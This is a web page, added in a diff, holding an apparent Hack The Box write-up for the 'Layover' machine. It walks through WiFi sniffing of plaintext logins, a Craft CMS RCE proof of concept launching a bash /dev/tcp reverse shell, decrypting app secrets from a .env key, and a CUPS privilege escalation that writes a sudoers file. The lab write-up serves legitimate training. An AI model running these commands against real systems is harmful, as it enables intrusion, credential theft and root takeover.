@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Layover</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-bot"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>Layover</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">12</span> Week <span class="highlight">#1</span></div>
+            <div class="row"> Machine <span class="highlight">Layover</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Medium</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">WiFi Sniffing</span>] [<span class="highlight">Craft CMS RCE</span>] [<span class="highlight">Yii decrypt</span>] [<span class="highlight">CUPS LPE</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>rustscan -a <span class="ph">&lt;target-ip&gt;</span> -- -sC -sV -T4 -oA nmap-result</code></pre>
+          <pre><code>PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+Service Info: OSs: Linux, Windows</code></pre>
+          <p>Only <code>ssh</code> and RDP are exposed — a <strong>jump server</strong>. Let's try the provided credential <code>contractor:Contractor2026!</code> over SSH first:</p>
+          <pre><code>ssh contractor@<span class="ph">&lt;target-ip&gt;</span></code></pre>
+          <pre><code>contractor@<span class="ph">&lt;attacker-ip&gt;</span>'s password:
+Permission denied, please try again.</code></pre>
+          <p>Rejected. Let's pivot to <code>3389</code> — connecting with <strong>Remmina</strong> (RDP) as <code>contractor</code> succeeds, dropping us onto the jump server desktop.</p>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-1.png" alt="RDP login as contractor via Remmina" onclick="toggleZoom(this)">
+          </div>
+
+          <h3>Network Enum — WiFi</h3>
+          <p>The jump server has 2 WLAN interfaces that are down. <code>nmcli</code> (NetworkManager) is the standard tool to check Wi-Fi devices and available access points:</p>
+          <pre><code>nmcli device status
+nmcli device wifi list</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-2.png" alt="nmcli WiFi devices and access points" onclick="toggleZoom(this)">
+          </div>
+
+          <p>We can see an available SSID: <strong>HTB International WiFi</strong>. Let's connect:</p>
+          <pre><code>nmcli dev wifi connect "HTB International WiFi"
+# Device 'wlan2' successfully activated with '&lt;redacted&gt;'.</code></pre>
+          <p>Connected. We have <strong>two</strong> Wi-Fi interfaces. Let's put the <strong>second</strong> into monitor mode and sniff the plaintext credentials being sent to the internal portal:</p>
+          <pre><code>sudo ip link set wlan3 down
+sudo iw dev wlan3 interface add mon0 type monitor
+sudo ip link set mon0 up
+sudo iw dev mon0 set channel 6
+
+sudo tshark -i mon0 \
+  -Y 'http.request.method == "POST"' \
+  -T fields \
+  -e ip.src \
+  -e ip.dst \
+  -e http.host \
+  -e http.request.full_uri \
+  -e urlencoded-form.key \
+  -e urlencoded-form.value</code></pre>
+          <p>After a few minutes we catch a plaintext HTTP login POST:</p>
+          <pre><code>Running as user "root" and group "root". This could be dangerous.
+Capturing on 'mon0'
+<span class="ph">&lt;jump-server-ip&gt;</span>	<span class="ph">&lt;web-server-ip&gt;</span>	portal.international.htb	http://portal.international.htb/miles/login.php	username,password	jenny,<span class="ph">&lt;password&gt;</span></code></pre>
+          <p>Credentials for <code>jenny</code> leaked over the wire. Let's use them on the web portal.</p>
+
+          <h3>Web Enum — Craft CMS</h3>
+          <p>Logging into <code>http://portal.international.htb/miles/login.php</code> as <strong>jenny</strong> works. The portal runs <strong>Craft CMS</strong> — let's confirm the admin surface:</p>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-3.png" alt="Logged in to portal as jenny" onclick="toggleZoom(this)">
+          </div>
+
+          <pre><code>curl -sI http://portal.international.htb/admin</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-4.png" alt="Craft CMS admin headers" onclick="toggleZoom(this)">
+          </div>
+
+          <div class="callout warning">
+            <strong>⚠️ CVE-2026-44011</strong>
+            Authenticated RCE in Craft CMS via Yii behavior injection.
+          </div>
+          <h2>2. Exploitation</h2>
+          <h3>RCE as <code>www-data</code></h3>
+          <p>Let's clone the PoC to the attacker box and host it:</p>
+          <pre><code>git clone https://github.com/khush-613/CVE-2026-44011-poc.git
+cd CVE-2026-44011-poc
+python3 -m http.server</code></pre>
+          <pre><code># on the jump server (reaches the internal portal)
+wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/exploit.py</code></pre>
+          <p>Test the <strong>RCE</strong> against the target — run from the jump server:</p>
+          <pre><code>python3 exploit.py \
+  -b http://portal.international.htb \
+  -u jenny \
+  -p '<span class="ph">&lt;password&gt;</span>' \
+  -c 'id' \
+  -H <span class="ph">&lt;jump-server-ip&gt;</span> --force</code></pre>
+          <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+          <p>RCE confirmed as <code>www-data</code>. Let's get a reverse shell:</p>
+          <pre><code>nc -lnvp 9001</code></pre>
+          <pre><code>python3 exploit.py \
+  -b http://portal.international.htb \
+  -u jenny \
+  -p '<span class="ph">&lt;password&gt;</span>' \
+  -c 'bash -c "bash -i 5&lt;&gt;/dev/tcp/<span class="ph">&lt;jump-server-ip&gt;</span>/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"' \
+  -H <span class="ph">&lt;jump-server-ip&gt;</span> --force</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-5.png" alt="Reverse shell caught on nc listener" onclick="toggleZoom(this)">
+          </div>
+
+          <h3>Access as <code>aporter</code></h3>
+          <p>From the <code>www-data</code> shell, the <code>/home</code> dir shows the real system user <code>aporter</code>. Let's check the app environment first:</p>
+          <pre><code>cat /var/www/portal/.env</code></pre>
+          <pre><code># The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=production
+
+# General settings
+CRAFT_SECURITY_KEY=<span class="ph">&lt;security-key&gt;</span>
+CRAFT_DEV_MODE=false
+CRAFT_ALLOW_ADMIN_CHANGES=false
+CRAFT_DISALLOW_ROBOTS=true
+
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craft
+CRAFT_DB_USER=<span class="ph">&lt;db-user&gt;</span>
+CRAFT_DB_PASSWORD=<span class="ph">&lt;db-password&gt;</span>
+CRAFT_DB_TABLE_PREFIX=</code></pre>
+          <div class="callout warning">
+            <strong>⚠️ Critical</strong>
+            The Craft CMS <code>.env</code> exposed <code>CRAFT_SECURITY_KEY</code> and the DB credentials. The database (or project config) may also hold an <em>encrypted</em> mail-transport password used for outgoing SMTP.
+          </div>
+          <p>Let's enumerate the database:</p>
+          <pre><code>mysql -h 127.0.0.1 -u <span class="ph">&lt;db-user&gt;</span> -p'<span class="ph">&lt;db-password&gt;</span>' -e "SHOW DATABASES;"
+mysql -h 127.0.0.1 -u <span class="ph">&lt;db-user&gt;</span> -p'<span class="ph">&lt;db-password&gt;</span>' craft -e "SHOW TABLES;"</code></pre>
+          <div class="callout info">
+            <strong>💡 Hint</strong>
+            <code>htbairways_settings</code> looks interesting.
+          </div>
+          <pre><code>mysql -h 127.0.0.1 -u <span class="ph">&lt;db-user&gt;</span> -p'<span class="ph">&lt;db-password&gt;</span>' craft -e "SELECT * FROM htbairways_settings;"</code></pre>
+          <p>The <code>mailRelayPassword</code> column holds the encrypted SMTP password. We have the app's own security key — let's decrypt it with Yii2's built-in <code>Security::decryptByKey()</code>:</p>
+          <pre><code>php -r "
+require '/var/www/portal/vendor/autoload.php';
+\$s = new \yii\base\Security();
+echo \$s->decryptByKey(base64_decode('<span class="ph">&lt;ciphertext&gt;</span>'), '<span class="ph">&lt;security-key&gt;</span>');
+"</code></pre>
+          <p>Since we can read both the <code>.env</code> security key and the database, calling <code>decryptByKey()</code> recovers the plaintext SMTP password. Classic password reuse: it also unlocks the local system user <code>aporter</code>.</p>
+          <pre><code>sshpass -p '<span class="ph">&lt;password&gt;</span>' ssh aporter@<span class="ph">&lt;web-server-ip&gt;</span></code></pre>
+          <pre><code>uid=1001(aporter) gid=1001(aporter) groups=1001(aporter)</code></pre>
+          <h2>3. Privilege Escalation</h2>
+          <h3>CUPS LPE → <code>root</code></h3>
+          <p>Let's enumerate running services as <code>aporter</code>:</p>
+          <pre><code>ps aux
+ps aux | grep cupsd</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-6.png" alt="cupsd running as root in ps aux" onclick="toggleZoom(this)">
+          </div>
+
+          <p><code>cupsd</code> catches our eye. It's the daemon for <strong>CUPS</strong> (Common Unix Printing System) — the standard Linux printing service that manages print jobs, printers, and print queues. It normally listens on port 631 and ships a web-based admin interface.</p>
+
+          <div class="note-image">
+            <img src="../src/images/layover/layover-7.png" alt="CUPS web admin interface" onclick="toggleZoom(this)">
+          </div>
+
+          <div class="callout warning">
+            <strong>⚠️ CUPS 2.4</strong>
+            <code>CVE-2026-34990</code> — CUPS 2.4.16 local privilege escalation via arbitrary file write through <code>CUPS_CREATE_LOCAL_PRINTER</code>. Affected <code>&lt;= CUPS 2.4.16</code>.
+          </div>
+          <p>Let's try it. Clone the PoC on the attacker box:</p>
+          <pre><code>git clone https://github.com/khush-613/CVE-2026-34990-poc
+cd CVE-2026-34990-poc
+python3 -m http.server</code></pre>
+          <pre><code># on the jump server
+wget http://<span class="ph">&lt;attacker-ip&gt;</span>:8000/exploit.py
+python3 -m http.server</code></pre>
+          <pre><code># on the web server
+wget http://<span class="ph">&lt;jump-server-ip&gt;</span>:8000/exploit.py</code></pre>
+          <p>Execute it — writing a <code>sudoers</code> drop-in for <code>aporter</code>:</p>
+          <pre><code>CUPS_TARGET=/etc/sudoers.d/aporter-pwn CUPS_ATTACKER=aporter python3 exploit.py</code></pre>
+          <pre><code>[+] SUCCESS
+[+] Root shell:
+root@portal:/home/aporter#</code></pre>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>/home/aporter/user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>/root/root.txt</code></li>
+          </ul>
+
+          <h2>Lessons</h2>
+          <ul class="lessons-list">
+            <li>RDP-exposed jump servers with WiFi allows full on-air credential harvesting — plaintext HTTP login forms leak creds to any monitor-mode sniff.</li>
+            <li><code>nmcli</code> is the go-to for Wi-Fi recon/connect on NetworkManager systems; a second interface lets you stay connected while sniffing.</li>
+            <li>Authenticated Craft CMS RCE (CVE-2026-44011) via Yii behavior injection is a clean foothold when web creds are known.</li>
+            <li>Readable <code>.env</code> + DB access lets you decrypt application secrets (Yii <code>Security::decryptByKey()</code>) — then reuse them as OS credentials.</li>
+            <li>CUPS local printers accept arbitrary file writes (<code>CUPS_CREATE_LOCAL_PRINTER</code>); a <code>sudoers.d</code> payload is a trivial root path.</li>
+          </ul>
+        </div>
+
+      </div>
+      <footer class="page-footer">// HACK THE PLANET — BUILD, BREAK, LEARN</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','python3','sudo','ssh','rustscan','curl','nc','cat','mysql','php','ps','git','nmcli','ip','iw','tshark','sshpass','cd','echo','grep','id','ls','mkdir'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
